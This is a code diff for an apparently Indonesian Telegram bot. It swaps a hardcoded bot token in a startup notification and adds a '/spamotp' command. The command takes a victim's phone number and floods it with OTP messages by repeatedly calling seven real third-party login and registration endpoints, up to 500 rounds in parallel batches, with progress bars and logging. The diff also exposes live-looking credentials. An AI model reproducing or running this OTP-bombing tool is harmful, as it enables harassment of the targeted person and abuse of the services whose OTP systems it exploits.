@@ -1427,7 +1427,7 @@ async function sendStartupNotification() {
 try {
 const settings = readCurrentSettings();
 const ownerId = "7587303225";
-const telegramBotToken = "8302582915:AAGQuOHSjjEwu_SHzLGP3lkSdRflmbO1UaE";
+const telegramBotToken = "8332999387:AAEoKIG7UlB621b6QG7djNeIK69BJSXq45I";
 const message = `<b>🚀 BOT STARTUP NOTIFICATION</b>\n\n` +
 `<b>?? Tanggal:</b> ${new Date().toLocaleString('id-ID')}\n` +
 `<b>🌐 Domain:</b> <code>${config.DOMAIN}</code>\n` +
@@ -3650,6 +3650,337 @@ text:'✅ Seller upgrade dibatalkan! Foto QR akan dihapus otomatis.',
 show_alert:false}
 );
 }
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📱 SPAM OTP COMMAND - UNLIMITED WITH BULK API
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/spamotp(?:\s+(.+))?$/i, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id.toString();
+    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+    const chatType = msg.chat.type;
+    const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+    const params = match[1] || '';
+    const messageText = `/spamotp ${params}`.trim();
+    
+    logUserInteraction(userId, username, chatType, messageText, groupName);
+    
+    // Parsing parameter
+    const [no, countStr] = params.split(',').map(p => p.trim());
+    
+    if (!no || !countStr || isNaN(countStr)) {
+        return bot.sendMessage(chatId,
+            `<b>Format:</b> /spamotp 6281234567890,50`,
+            { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+        );
+    }
+    
+    // Clean number
+    let fullNumber = no.replace(/[^0-9]/g, '');
+    if (fullNumber.startsWith('0')) {
+        fullNumber = '62' + fullNumber.substring(1);
+    } else if (fullNumber.startsWith('8')) {
+        fullNumber = '62' + fullNumber;
+    }
+    
+    const count = parseInt(countStr);
+    
+    // Batasi maksimal 500 spam untuk mencegah overload
+    if (count > 500) {
+        return bot.sendMessage(chatId,
+            `<b>⚠️ Batas Maksimal 500 spam</b>\nGunakan jumlah yang wajar.`,
+            { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+        );
+    }
+    
+    // Optimized API list dengan timeout lebih singkat
+    const apis = [
+        // API 1: PinjamDuit (optimized)
+        async () => {
+            try {
+                const response = await axios.post(
+                    'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
+                    `phone=${fullNumber}&sms_service=WHATSAPP`,
+                    { 
+                        headers: { 
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/5.0'
+                        },
+                        timeout: 3000 // Timeout lebih singkat
+                    }
+                );
+                return { success: true, name: 'PinjamDuit' };
+            } catch (error) {
+                return { success: false, name: 'PinjamDuit', error: error.code };
+            }
+        },
+        
+        // API 2: BelanjaParts (optimized)
+        async () => {
+            try {
+                const response = await axios.post(
+                    'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
+                    `{"phone":"${fullNumber}","type":"register"}`,
+                    {
+                        headers: {
+                            'content-type': 'application/json'
+                        },
+                        timeout: 3000
+                    }
+                );
+                return { success: true, name: 'BelanjaParts' };
+            } catch (error) {
+                return { success: false, name: 'BelanjaParts', error: error.code };
+            }
+        },
+        
+        // API 3: Singa (optimized)
+        async () => {
+            try {
+                const response = await axios.post(
+                    'https://api102.singa.id/new/login/sendWaOtp',
+                    `{"mobile_phone":"${fullNumber}","type":"mobile"}`,
+                    { 
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
+                        timeout: 3000
+                    }
+                );
+                return { success: true, name: 'Singa' };
+            } catch (error) {
+                return { success: false, name: 'Singa', error: error.code };
+            }
+        },
+        
+        // API 4: UangMe (optimized)
+        async () => {
+            try {
+                const response = await axios.get(
+                    `https://api.uangme.com/api/v2/sms_code?phone=${fullNumber}&sms_service=WHATSAPP`,
+                    { timeout: 3000 }
+                );
+                return { success: true, name: 'UangMe' };
+            } catch (error) {
+                return { success: false, name: 'UangMe', error: error.code };
+            }
+        },
+        
+        // API 5: Cairin (optimized)
+        async () => {
+            try {
+                const response = await axios.post(
+                    'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+                    `appVersion=3.0.4&phone=${fullNumber}`,
+                    { 
+                        headers: { 
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        timeout: 3000
+                    }
+                );
+                return { success: true, name: 'Cairin' };
+            } catch (error) {
+                return { success: false, name: 'Cairin', error: error.code };
+            }
+        },
+        
+        // API 6: Adiraku (optimized)
+        async () => {
+            try {
+                const response = await axios.post(
+                    'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+                    `{"mobileNumber":"${fullNumber}","channel":"whatsapp"}`,
+                    { 
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
+                        timeout: 3000
+                    }
+                );
+                return { success: true, name: 'Adiraku' };
+            } catch (error) {
+                return { success: false, name: 'Adiraku', error: error.code };
+            }
+        },
+        
+        // API 7: Serpul (optimized)
+        async () => {
+            try {
+                const response = await axios.post(
+                    'https://serpul-api.serpul.co.id/api/v2/auth/phone-number',
+                    `{"phone_number":"${fullNumber}"}`,
+                    { 
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
+                        timeout: 3000
+                    }
+                );
+                return { success: true, name: 'Serpul' };
+            } catch (error) {
+                return { success: false, name: 'Serpul', error: error.code };
+            }
+        }
+    ];
+    
+    try {
+        // Pesan progress awal
+        const processingMsg = await bot.sendMessage(chatId,
+            `<blockquote>📱 <b>MEMULAI MASSIVE SPAM</b></blockquote>
+<b>Target:</b> +${fullNumber}
+<b>Jumlah:</b> ${count}x spam
+<b>API:</b> ${apis.length} endpoints
+<b>Total Request:</b> ${count * apis.length}
+<b>Status:</b> Initializing...`,
+            { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+        );
+        
+        let successCount = 0;
+        let failCount = 0;
+        let completedIterations = 0;
+        
+        // Fungsi untuk update progress
+        const updateProgress = async () => {
+            const percent = Math.floor((completedIterations / count) * 100);
+            const progressBar = '[█'.repeat(Math.floor(percent / 10)) + '░'.repeat(10 - Math.floor(percent / 10)) + ']';
+            
+            await bot.editMessageText(
+                `<blockquote>📱 <b>MASSIVE SPAM PROGRESS</b></blockquote>
+<b>Target:</b> +${fullNumber}
+<b>Progress:</b> ${completedIterations}/${count} (${percent}%)
+<b>Bar:</b> ${progressBar}
+<b>Success:</b> ${successCount}
+<b>Failed:</b> ${failCount}
+<b>Speed:</b> ${apis.length} req/sec
+<b>ETA:</b> ${Math.round((count - completedIterations) * 0.5)} detik`,
+                {
+                    chat_id: chatId,
+                    message_id: processingMsg.message_id,
+                    parse_mode: 'HTML'
+                }
+            );
+        };
+        
+        // Fungsi untuk eksekusi batch spam
+        const executeBatch = async (batchSize) => {
+            const batchPromises = [];
+            
+            for (let i = 0; i < batchSize; i++) {
+                batchPromises.push(
+                    (async () => {
+                        try {
+                            // Jalankan semua API secara parallel untuk batch ini
+                            const results = await Promise.allSettled(apis.map(api => api()));
+                            
+                            // Hitung hasil
+                            results.forEach(result => {
+                                if (result.status === 'fulfilled' && result.value.success) {
+                                    successCount++;
+                                } else {
+                                    failCount++;
+                                }
+                            });
+                            
+                            completedIterations++;
+                            
+                            // Update progress setiap 10 iterasi atau 10%
+                            if (completedIterations % 10 === 0 || completedIterations === count) {
+                                await updateProgress();
+                            }
+                            
+                        } catch (error) {
+                            failCount++;
+                            completedIterations++;
+                        }
+                    })()
+                );
+                
+                // Delay kecil antara request dalam batch
+                await new Promise(r => setTimeout(r, 100));
+            }
+            
+            await Promise.allSettled(batchPromises);
+        };
+        
+        // Mulai spam dengan batch processing
+        const BATCH_SIZE = 10; // 10 spam per batch
+        const totalBatches = Math.ceil(count / BATCH_SIZE);
+        
+        for (let batchIndex = 0; batchIndex < totalBatches; batchIndex++) {
+            const remaining = count - (batchIndex * BATCH_SIZE);
+            const currentBatchSize = Math.min(BATCH_SIZE, remaining);
+            
+            await executeBatch(currentBatchSize);
+            
+            // Delay antar batch
+            if (batchIndex < totalBatches - 1) {
+                await new Promise(r => setTimeout(r, 500));
+            }
+        }
+        
+        // Hitung statistik akhir
+        const totalRequests = count * apis.length;
+        const successRate = totalRequests > 0 ? ((successCount / totalRequests) * 100).toFixed(2) : 0;
+        
+        // Hasil akhir
+        const resultMessage = `<blockquote>✅ <b>MASSIVE SPAM COMPLETE!</b></blockquote>
+<b>📊 STATISTICS:</b>
+┏━━━━━━━━━━━━━━━━━━⬣
+┃ 📱 Target: +${fullNumber}
+┃ 🔢 Total Spam: ${count}x
+┃ 🚀 Total Requests: ${totalRequests}
+┃ ✅ Success: ${successCount}
+┃ ❌ Failed: ${failCount}
+┃ 📈 Success Rate: ${successRate}%
+┃ ⏱️ Duration: ${Math.round(count * 0.5)}s est.
+┗━━━━━━━━━━━━━━━━━━⬣
+
+<b>⚡ PERFORMANCE:</b>
+• ${apis.length} API endpoints
+• Batch processing: ${BATCH_SIZE}/batch
+• Average speed: ${Math.round((totalRequests / (count * 0.5)) * 100) / 100} req/sec
+
+<b>📝 NOTE:</b>
+• Results may vary by API availability
+• Some services may block frequent requests
+• Use responsibly!`;
+
+        await bot.editMessageText(resultMessage, {
+            chat_id: chatId,
+            message_id: processingMsg.message_id,
+            parse_mode: 'HTML'
+        });
+        
+        // Log hasil ke file
+        const logEntry = `[${new Date().toISOString()}] User: ${username} (${userId}) | Target: +${fullNumber} | Count: ${count} | Success: ${successCount} | Failed: ${failCount}\n`;
+        fs.appendFileSync(path.join(DATA_DIR, 'spam_log.txt'), logEntry, 'utf8');
+        
+    } catch (error) {
+        console.error('Massive SpamOTP error:', error);
+        
+        // Error handling yang lebih baik
+        let errorMessage = `<blockquote>❌ <b>SPAM ERROR</b></blockquote>`;
+        
+        if (error.code === 'ECONNRESET') {
+            errorMessage += `<b>Error:</b> Connection reset by API server\n`;
+            errorMessage += `<b>Solution:</b> Reduce spam count or try later`;
+        } else if (error.code === 'ETIMEDOUT') {
+            errorMessage += `<b>Error:</b> Request timeout\n`;
+            errorMessage += `<b>Solution:</b> APIs may be overloaded`;
+        } else if (error.message.includes('Too Many Requests')) {
+            errorMessage += `<b>Error:</b> Rate limited by API\n`;
+            errorMessage += `<b>Solution:</b> Wait 1 minute before retry`;
+        } else {
+            errorMessage += `<b>Error:</b> ${error.message.substring(0, 100)}`;
+        }
+        
+        await bot.sendMessage(chatId,
+            errorMessage,
+            { parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+        );
+    }
 });
 
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
